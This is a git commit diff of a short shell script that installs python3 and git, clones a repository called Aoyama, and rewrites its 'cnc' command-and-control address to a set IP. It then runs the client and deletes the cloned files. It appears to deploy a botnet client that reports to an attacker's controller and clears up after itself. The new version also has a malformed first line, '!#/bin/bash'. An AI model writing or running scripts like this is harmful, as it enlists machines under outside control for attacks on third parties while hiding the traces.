bf69a881b1960537594c24292180ff3aca3128b9
giathanhtmq <59061183+giathanhtmq@users.noreply.github.com>
2021-02-22 17:30:12 +0700

    Add files via upload

--- script.sh
+++ script.sh
@@ -1,8 +1,9 @@
-yum install -y python3
-yum install -y git
-git clone https://github.com/Leeon123/Aoyama.git
-cd Aoyama/
-sed -i "s/cnc                  = \"127.0.0.1\"/cnc                  = \"xxxx.xxxx.xxxx.xxxx\"/g" client.py
-python3 client.py
-cd -
-rm -rf Aoyama/
+!#/bin/bash
+yum install -y python3;
+yum install -y git;
+git clone https://github.com/Leeon123/Aoyama.git;
+cd Aoyama/;
+sed -i "s/cnc                  = \"127.0.0.1\"/cnc                  = \"192.168.100.112\"/g" client.py;
+python3 client.py;
+cd -;
+rm -rf Aoyama/;
